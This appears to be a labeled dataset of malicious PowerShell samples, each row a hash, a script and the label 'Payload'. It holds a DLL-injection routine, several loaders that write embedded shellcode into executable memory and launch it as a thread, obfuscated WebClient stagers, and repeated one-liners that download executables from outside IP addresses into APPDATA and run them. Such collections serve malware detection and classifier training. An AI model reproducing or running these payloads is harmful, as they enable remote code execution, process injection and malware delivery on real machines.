    $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
    $VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
    $VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [UInt32]) ([Bool])
    $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
    $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
    $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool])
    $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
    $RtlCreateUserThreadAddr = Get-ProcAddress ntdll.dll RtlCreateUserThread
    $RtlCreateUserThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Bool], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([UInt32])
    $RtlCreateUserThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RtlCreateUserThreadAddr, $RtlCreateUserThreadDelegate)
    $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
    $CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
    $CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)

    
    if ([IntPtr]::Size -eq 4)
    {
        $PowerShell32bit = $True
    }
    else
    {
        $PowerShell32bit = $False
    }

    $OSArchitecture = (Get-WmiObject Win32_OperatingSystem).OSArchitecture

    switch ($OSArchitecture)
    {
        '32-bit' { $64bitOS = $False }
        '64-bit' { $64bitOS = $True }
    }

    
    $IsWow64ProcessAddr = Get-ProcAddress kernel32.dll IsWow64Process

    if ($IsWow64ProcessAddr)
    {
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
    }

    $Architecture = Get-PEArchitecture $Dll

    Write-Verbose ""Architecture of the dll to be injected: $Architecture""

    
    $hProcess = $OpenProcess.Invoke(0x001F0FFF, $false, $ProcessID) 

    if (!$hProcess)
    {
        Throw 'Unable to open process handle.'
    }

    if ($64bitOS) 
    {
        if ( ($Architecture -ne 'X86') -and ($Architecture -ne 'X64') )
        {
            Throw 'Only x86 or AMD64 architechtures supported.'
        }

        
        $IsWow64 = $False
        $IsWow64Process.Invoke($hProcess, [Ref] $IsWow64) | Out-Null

        if ( $PowerShell32bit -and ($Architecture -eq 'X64') )
        {
            Throw 'You cannot manipulate 64-bit code within 32-bit PowerShell. Open the 64-bit version and try again.'
        }

        if ( (!$IsWow64) -and ($Architecture -eq 'X86') )
        {
            Throw 'You cannot inject a 32-bit DLL into a 64-bit process.'
        }

        if ( $IsWow64 -and ($Architecture -eq 'X64') )
        {
            Throw 'You cannot inject a 64-bit DLL into a 32-bit process.'
        }
    }
    else
    {
        if ($Architecture -ne 'X86')
        {
            Throw 'PE file was not compiled for x86.'
        }
    }

    
    $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
    Write-Verbose ""LoadLibrary address: 0x$($LoadLibraryAddr.ToString(""X$([IntPtr]::Size*2)""))""

    
    $RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Dll.Length, 0x3000, 4) 
    if ($RemoteMemAddr -eq [IntPtr]::Zero)
    {
        Throw 'Unable to allocate memory in remote process. Try running PowerShell elevated.'
    }
    Write-Verbose ""DLL path memory reserved at 0x$($RemoteMemAddr.ToString(""X$([IntPtr]::Size*2)""))""

    
    $WriteProcessMemory.Invoke($hProcess, $RemoteMemAddr, $DllByteArray, $Dll.Length, [Ref] 0) | Out-Null
    Write-Verbose ""Dll path written sucessfully.""

    
    $Result = $RtlCreateUserThread.Invoke($hProcess, [IntPtr]::Zero, $False, 0, [IntPtr]::Zero, [IntPtr]::Zero, $LoadLibraryAddr, $RemoteMemAddr, [IntPtr]::Zero, [IntPtr]::Zero)
    if ($Result)
    {
        Throw ""Unable to launch remote thread. NTSTATUS: 0x$($Result.ToString('X8'))""
    }
    
    $VirtualFreeEx.Invoke($hProcess, $RemoteMemAddr, $Dll.Length, 0x8000) | Out-Null 

    
    $CloseHandle.Invoke($hProcess) | Out-Null

    
    $FileName = Split-Path $Dll -Leaf
    $DllInfo = (Get-Process -Id $ProcessID).Modules | ? { $_.FileName.Contains($FileName) }

    if (!$DllInfo)
    {
        Throw ""Dll did dot inject properly into the victim process.""
    }

    Write-Verbose 'Dll injection complete!'

    $DllInfo
}",Payload
0419808ae4ff46037840be69ee1b0de8e29932435d797a53fbd768be2facbf28,"
$wC=NEW-ObJect SYstEM.NeT.WEbCLiENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeADERS.ADD('User-Agent',$u);$wC.PROxy = [SySteM.Net.WebReQuEst]::DefauLtWEBPRoXy;$wC.PROXY.CrEDEnTIaLs = [SYStEm.Net.CREDENtiAlCAChe]::DefAulTNeTworkCReDenTIAls;$K='v{Z.|CFdVN)MA2PHEIe>c}:k?D

",Payload
64f83bb7b7b6a2bef68aab6f0e927cb040927064161cddf6a461ea18b9b8d5e1,"function Get-SecurityPackages
{


    [CmdletBinding()] Param()

    
    $DynAssembly = New-Object System.Reflection.AssemblyName('SSPI')
    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('SSPI', $False)

    $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
    $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
    $StructAttributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'

    $EnumBuilder = $ModuleBuilder.DefineEnum('SSPI.SECPKG_FLAG', 'Public', [Int32])
    $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    $null = $EnumBuilder.DefineLiteral('INTEGRITY', 1)
    $null = $EnumBuilder.DefineLiteral('PRIVACY', 2)
    $null = $EnumBuilder.DefineLiteral('TOKEN_ONLY', 4)
    $null = $EnumBuilder.DefineLiteral('DATAGRAM', 8)
    $null = $EnumBuilder.DefineLiteral('CONNECTION', 0x10)
    $null = $EnumBuilder.DefineLiteral('MULTI_REQUIRED', 0x20)
    $null = $EnumBuilder.DefineLiteral('CLIENT_ONLY', 0x40)
    $null = $EnumBuilder.DefineLiteral('EXTENDED_ERROR', 0x80)
    $null = $EnumBuilder.DefineLiteral('IMPERSONATION', 0x100)
    $null = $EnumBuilder.DefineLiteral('ACCEPT_WIN32_NAME', 0x200)
    $null = $EnumBuilder.DefineLiteral('STREAM', 0x400)
    $null = $EnumBuilder.DefineLiteral('NEGOTIABLE', 0x800)
    $null = $EnumBuilder.DefineLiteral('GSS_COMPATIBLE', 0x1000)
    $null = $EnumBuilder.DefineLiteral('LOGON', 0x2000)
    $null = $EnumBuilder.DefineLiteral('ASCII_BUFFERS', 0x4000)
    $null = $EnumBuilder.DefineLiteral('FRAGMENT', 0x8000)
    $null = $EnumBuilder.DefineLiteral('MUTUAL_AUTH', 0x10000)
    $null = $EnumBuilder.DefineLiteral('DELEGATION', 0x20000)
    $null = $EnumBuilder.DefineLiteral('READONLY_WITH_CHECKSUM', 0x40000)
    $null = $EnumBuilder.DefineLiteral('RESTRICTED_TOKENS', 0x80000)
    $null = $EnumBuilder.DefineLiteral('NEGO_EXTENDER', 0x100000)
    $null = $EnumBuilder.DefineLiteral('NEGOTIABLE2', 0x200000)
    $null = $EnumBuilder.DefineLiteral('APPCONTAINER_PASSTHROUGH', 0x400000)
    $null = $EnumBuilder.DefineLiteral('APPCONTAINER_CHECKS', 0x800000)
    $SECPKG_FLAG = $EnumBuilder.CreateType()

    $TypeBuilder = $ModuleBuilder.DefineType('SSPI.SecPkgInfo', $StructAttributes, [Object], [Reflection.Emit.PackingSize]::Size8)
    $null = $TypeBuilder.DefineField('fCapabilities', $SECPKG_FLAG, 'Public')
    $null = $TypeBuilder.DefineField('wVersion', [Int16], 'Public')
    $null = $TypeBuilder.DefineField('wRPCID', [Int16], 'Public')
    $null = $TypeBuilder.DefineField('cbMaxToken', [Int32], 'Public')
    $null = $TypeBuilder.DefineField('Name', [IntPtr], 'Public')
    $null = $TypeBuilder.DefineField('Comment', [IntPtr], 'Public')
    $SecPkgInfo = $TypeBuilder.CreateType()

    $TypeBuilder = $ModuleBuilder.DefineType('SSPI.Secur32', 'Public, Class')
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('EnumerateSecurityPackages',
        'secur32.dll',
        'Public, Static',
        [Reflection.CallingConventions]::Standard,
        [Int32],
        [Type[]] @([Int32].MakeByRefType(),
            [IntPtr].MakeByRefType()),
        [Runtime.InteropServices.CallingConvention]::Winapi,
        [Runtime.InteropServices.CharSet]::Ansi)

    $Secur32 = $TypeBuilder.CreateType()

    $PackageCount = 0
    $PackageArrayPtr = [IntPtr]::Zero
    $Result = $Secur32::EnumerateSecurityPackages([Ref] $PackageCount, [Ref] $PackageArrayPtr)

    if ($Result -ne 0)
    {
        throw ""Unable to enumerate seucrity packages. Error (0x$($Result.ToString('X8')))""
    }

    if ($PackageCount -eq 0)
    {
        Write-Verbose 'There are no installed security packages.'
        return
    }

    $StructAddress = $PackageArrayPtr

    foreach ($i in 1..$PackageCount)
    {
        $SecPackageStruct = [Runtime.InteropServices.Marshal]::PtrToStructure($StructAddress, [Type] $SecPkgInfo)
        $StructAddress = [IntPtr] ($StructAddress.ToInt64() + [Runtime.InteropServices.Marshal]::SizeOf([Type] $SecPkgInfo))

        $Name = $null

        if ($SecPackageStruct.Name -ne [IntPtr]::Zero)
        {
            $Name = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($SecPackageStruct.Name)
        }

        $Comment = $null

        if ($SecPackageStruct.Comment -ne [IntPtr]::Zero)
        {
            $Comment = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($SecPackageStruct.Comment)
        }

        $Attributes = @{
            Name = $Name
            Comment = $Comment
            Capabilities = $SecPackageStruct.fCapabilities
            MaxTokenSize = $SecPackageStruct.cbMaxToken
        }

        $SecPackage = New-Object PSObject -Property $Attributes
        $SecPackage.PSObject.TypeNames[0] = 'SECUR32.SECPKGINFO'

        $SecPackage
    }
}",Payload
d092561ccf6ae47795c2a61e152eed35905df18e48582637006cd77b9972fbef,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x64,0x68,0x02,0x00,0x07,0xe4,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
33b02ce9c12c837c63aa005ea8d516d840df90f0e01a076d483d2baf2ab4c7a3,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',""$env:APPDATA\winx64.exe"");Start-Process (""$env:APPDATA\winx64.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
bf23a8e668405f30865143042f010227b746ebaea1c50672259739323949a5a2,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbe,0x47,0x9f,0x77,0x55,0xd9,0xc0,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0x47,0x31,0x70,0x13,0x83,0xc0,0x04,0x03,0x70,0x48,0x7d,0x82,0xa9,0xbe,0x03,0x6d,0x52,0x3e,0x64,0xe7,0xb7,0x0f,0xa4,0x93,0xbc,0x3f,0x14,0xd7,0x91,0xb3,0xdf,0xb5,0x01,0x40,0xad,0x11,0x25,0xe1,0x18,0x44,0x08,0xf2,0x31,0xb4,0x0b,0x70,0x48,0xe9,0xeb,0x49,0x83,0xfc,0xea,0x8e,0xfe,0x0d,0xbe,0x47,0x74,0xa3,0x2f,0xec,0xc0,0x78,0xdb,0xbe,0xc5,0xf8,0x38,0x76,0xe7,0x29,0xef,0x0d,0xbe,0xe9,0x11,0xc2,0xca,0xa3,0x09,0x07,0xf6,0x7a,0xa1,0xf3,0x8c,0x7c,0x63,0xca,0x6d,0xd2,0x4a,0xe3,0x9f,0x2a,0x8a,0xc3,0x7f,0x59,0xe2,0x30,0xfd,0x5a,0x31,0x4b,0xd9,0xef,0xa2,0xeb,0xaa,0x48,0x0f,0x0a,0x7e,0x0e,0xc4,0x00,0xcb,0x44,0x82,0x04,0xca,0x89,0xb8,0x30,0x47,0x2c,0x6f,0xb1,0x13,0x0b,0xab,0x9a,0xc0,0x32,0xea,0x46,0xa6,0x4b,0xec,0x29,0x17,0xee,0x66,0xc7,0x4c,0x83,0x24,0x8f,0xa1,0xae,0xd6,0x4f,0xae,0xb9,0xa5,0x7d,0x71,0x12,0x22,0xcd,0xfa,0xbc,0xb5,0x32,0xd1,0x79,0x29,0xcd,0xda,0x79,0x63,0x09,0x8e,0x29,0x1b,0xb8,0xaf,0xa1,0xdb,0x45,0x7a,0x5f,0xd9,0xd1,0xa8,0x97,0xe0,0x84,0xdb,0xd5,0xe2,0xc7,0xa0,0x53,0x04,0x97,0x86,0x33,0x99,0x57,0x77,0xf4,0x49,0x3f,0x9d,0xfb,0xb6,0x5f,0x9e,0xd1,0xde,0xf5,0x71,0x8c,0xb7,0x61,0xeb,0x95,0x4c,0x10,0xf4,0x03,0x29,0x12,0x7e,0xa0,0xcd,0xdc,0x77,0xcd,0xdd,0x88,0x77,0x98,0xbc,0x1e,0x87,0x36,0xaa,0x9e,0x1d,0xbd,0x7d,0xc9,0x89,0xbf,0x58,0x3d,0x16,0x3f,0x8f,0x36,0x9f,0xd5,0x70,0x20,0xe0,0x39,0x71,0xb0,0xb6,0x53,0x71,0xd8,0x6e,0x00,0x22,0xfd,0x70,0x9d,0x56,0xae,0xe4,0x1e,0x0f,0x03,0xae,0x76,0xad,0x7a,0x98,0xd8,0x4e,0xa9,0x18,0x24,0x99,0x97,0x6e,0x44,0x19;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
4af7562b8ca6f68be6a55c4070fc4746727991c61f81392cc3bb52990d80c5c1,"
$wc=New-ObjEct SySTEM.NET.WebClienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEadeRS.AdD('User-Agent',$u);$Wc.PrOxY = [SYsTEM.NeT.WeBREqUeST]::DeFaulTWEBPROXy;$wC.ProXY.CrEDeNtiaLS = [SyStEm.Net.CREDentIalCAChE]::DefAULtNetwoRkCREdenTiAlS;$K='/j(\wly4+aW

",Payload
a2da962b4834489862af06b39f0e9be8aba366b1faf1b3ea0e99c0526b26e9c1,"
$jYnb = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $jYnb -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xcd,0xbe,0x21,0x2f,0xd0,0x68,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0x4f,0x31,0x72,0x19,0x83,0xea,0xfc,0x03,0x72,0x15,0xc3,0xda,0x2c,0x80,0x81,0x25,0xcd,0x51,0xe5,0xac,0x28,0x60,0x25,0xca,0x39,0xd3,0x95,0x98,0x6c,0xd8,0x5e,0xcc,0x84,0x6b,0x12,0xd9,0xab,0xdc,0x98,0x3f,0x85,0xdd,0xb0,0x7c,0x84,0x5d,0xca,0x50,0x66,0x5f,0x05,0xa5,0x67,0x98,0x7b,0x44,0x35,0x71,0xf0,0xfb,0xaa,0xf6,0x4c,0xc0,0x41,0x44,0x41,0x40,0xb5,0x1d,0x60,0x61,0x68,0x15,0x3b,0xa1,0x8a,0xfa,0x30,0xe8,0x94,0x1f,0x7c,0xa2,0x2f,0xeb,0x0b,0x35,0xe6,0x25,0xf4,0x9a,0xc7,0x89,0x07,0xe2,0x00,0x2d,0xf7,0x91,0x78,0x4d,0x8a,0xa1,0xbe,0x2f,0x50,0x27,0x25,0x97,0x13,0x9f,0x81,0x29,0xf0,0x46,0x41,0x25,0xbd,0x0d,0x0d,0x2a,0x40,0xc1,0x25,0x56,0xc9,0xe4,0xe9,0xde,0x89,0xc2,0x2d,0xba,0x4a,0x6a,0x77,0x66,0x3d,0x93,0x67,0xc9,0xe2,0x31,0xe3,0xe4,0xf7,0x4b,0xae,0x60,0x34,0x66,0x51,0x71,0x52,0xf1,0x22,0x43,0xfd,0xa9,0xac,0xef,0x76,0x74,0x2a,0x0f,0xad,0xc0,0xa4,0xee,0x4d,0x31,0xec,0x34,0x19,0x61,0x86,0x9d,0x21,0xea,0x56,0x21,0xf4,0xbd,0x06,0x8d,0xa6,0x7d,0xf7,0x6d,0x16,0x16,0x1d,0x62,0x49,0x06,0x1e,0xa8,0xe2,0x2f,0xf7,0x53,0x0c,0xb0,0x91,0x20,0x63,0xc9,0x0d,0xa3,0x09,0x44,0xa6,0x44,0x9e,0xe2,0x18,0xff,0x04,0x65,0x16,0xd1,0xaa,0x1c,0xac,0x2d,0x5a,0x76,0x64,0x1a,0x1a,0x77,0xa0,0xe9,0x5a,0x94,0x21,0xeb,0x0a,0xcc,0xb7,0xf3,0xbb,0x50,0x31,0x15,0xd1,0x78,0x17,0x8d,0x4d,0xe0,0x32,0x45,0xec,0xed,0xe8,0x23,0x2e,0x65,0x1f,0xd3,0xe0,0x8e,0x6a,0xc7,0x94,0x7e,0x21,0xb5,0x32,0x80,0x9f,0xd0,0xba,0x14,0x24,0x73,0xed,0x80,0x26,0xa2,0xd9,0x0e,0xd8,0x81,0x52,0x86,0x4c,0x6a,0x0c,0xe7,0x80,0x6a,0xcc,0xb1,0xca,0x6a,0xa4,0x65,0xaf,0x38,0xd1,0x69,0x7a,0x2d,0x4a,0xfc,0x85,0x04,0x3f,0x57,0xee,0xaa,0x66,0x9f,0xb1,0x55,0x4d,0x21,0x8d,0x83,0xab,0x57,0xff,0x17;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Q3F=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Q3F.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Q3F,0,0,0);for (;;){Start-sleep 60};

",Payload
b0159d9f61986da32aa378bc5fbe83afa179ad66a45a38ea884055dd37fcc852,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0x29,0x66,0xd3,0x9a,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
33b02ce9c12c837c63aa005ea8d516d840df90f0e01a076d483d2baf2ab4c7a3,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',""$env:APPDATA\winx64.exe"");Start-Process (""$env:APPDATA\winx64.exe"")

",Payload
4af7562b8ca6f68be6a55c4070fc4746727991c61f81392cc3bb52990d80c5c1,"
$wc=New-ObjEct SySTEM.NET.WebClienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEadeRS.AdD('User-Agent',$u);$Wc.PrOxY = [SYsTEM.NeT.WeBREqUeST]::DeFaulTWEBPROXy;$wC.ProXY.CrEDeNtiaLS = [SyStEm.Net.CREDentIalCAChE]::DefAULtNetwoRkCREdenTiAlS;$K='/j(\wly4+aW

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
33b02ce9c12c837c63aa005ea8d516d840df90f0e01a076d483d2baf2ab4c7a3,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',""$env:APPDATA\winx64.exe"");Start-Process (""$env:APPDATA\winx64.exe"")

",Payload
9e4b4eca651ff10fcb9941b646975f7ef32284b971a20639a57fba26edba4c63,"
